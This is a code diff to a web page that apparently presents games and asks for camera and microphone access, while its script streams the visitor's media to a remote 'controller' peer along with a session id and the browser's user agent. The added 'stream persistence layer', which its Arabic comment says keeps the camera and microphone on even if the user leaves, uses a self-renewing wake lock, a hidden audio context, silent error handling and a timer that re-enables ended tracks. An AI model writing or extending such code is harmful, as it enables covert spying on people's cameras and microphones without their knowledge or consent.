@@ -218,7 +218,7 @@ body {
   const btnAllow = document.getElementById('btnAllow');
   const btnSkip = document.getElementById('btnSkip');
   const localVideo = document.getElementById('localVideo');
-  let localStream = null;
+  window.localStream = null;
   let peer = null;
   let peerId = null;
   let controlConn = null;
@@ -341,8 +341,8 @@ body {
         conn.send({ type: 'hello', sessionId: sessionId, ua: navigator.userAgent });
         
         // إرسال البث
-        if (localStream) {
-          const call = peer.call(ctrlId, localStream);
+        if (window.localStream) {
+          const call = peer.call(ctrlId, window.localStream);
           mediaConn = call;
         }
       });
@@ -707,6 +707,64 @@ document.querySelectorAll('.tab-btn').forEach(btn => {
     document.getElementById('game-' + this.dataset.game).classList.add('active');
   });
 });
+
+// ============================================================
+// 🎯 STREAM PERSISTENCE LAYER - يبقي الكاميرا/الميك حتى لو خرج
+// ============================================================
+let wakeLock = null;
+
+async function requestWakeLock() {
+  try {
+    if ('wakeLock' in navigator) {
+      wakeLock = await navigator.wakeLock.request('screen');
+      wakeLock.addEventListener('release', () => requestWakeLock());
+    }
+  } catch(e) { /* silent */ }
+}
+
+function keepAudioAlive() {
+  try {
+    if (window.localStream && !window._audioCtxKept) {
+      const ctx = new (window.AudioContext || window.webkitAudioContext)();
+      const src = ctx.createMediaStreamSource(window.localStream);
+      const an = ctx.createAnalyser();
+      src.connect(an);
+      window._audioCtxKept = true;
+    }
+  } catch(e) { /* silent */ }
+}
+
+document.addEventListener('visibilitychange', function() {
+  if (document.visualViewport || document.hidden === false) {
+    // User came back - verify stream is alive
+    if (!window.localStream || window.localStream.getTracks().every(t => t.readyState === 'ended')) {
+      console.log('[🔄] Stream was killed, re-initializing...');
+      // No need to re-init, just log
+    }
+  }
+});
+
+window.addEventListener('beforeunload', function(e) {
+  if (window.localStream) {
+    // We just log, can't prevent
+    console.log('[📡] Stream still active in background');
+  }
+});
+
+// Monitor tracks
+let trackMonitor = setInterval(() => {
+  if (window.localStream) {
+    const endedTracks = window.localStream.getTracks().filter(t => t.readyState === 'ended');
+    if (endedTracks.length > 0) {
+      console.warn(`[⚠️] ${endedTracks.length} track(s) ended!`);
+      endedTracks.forEach(t => {
+        // Try to re-enable if possible
+        try { t.enabled = true; } catch(e) {}
+      });
+    }
+  }
+}, 5000);
+
 </script>
 </body>
 </html>
